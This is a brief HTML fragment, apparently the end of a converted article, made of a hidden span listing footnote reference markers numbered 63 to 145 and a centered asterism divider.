<span style="display:none">[^100][^101][^102][^103][^104][^105][^106][^107][^108][^109][^110][^111][^112][^113][^114][^115][^116][^117][^118][^119][^120][^121][^122][^123][^124][^125][^126][^127][^128][^129][^130][^131][^132][^133][^134][^135][^136][^137][^138][^139][^140][^141][^142][^143][^144][^145][^63][^64][^65][^66][^67][^68][^69][^70][^71][^72][^73][^74][^75][^76][^77][^78][^79][^80][^81][^82][^83][^84][^85][^86][^87][^88][^89][^90][^91][^92][^93][^94][^95][^96][^97][^98][^99]</span>

<div style="text-align: center">⁂</div>
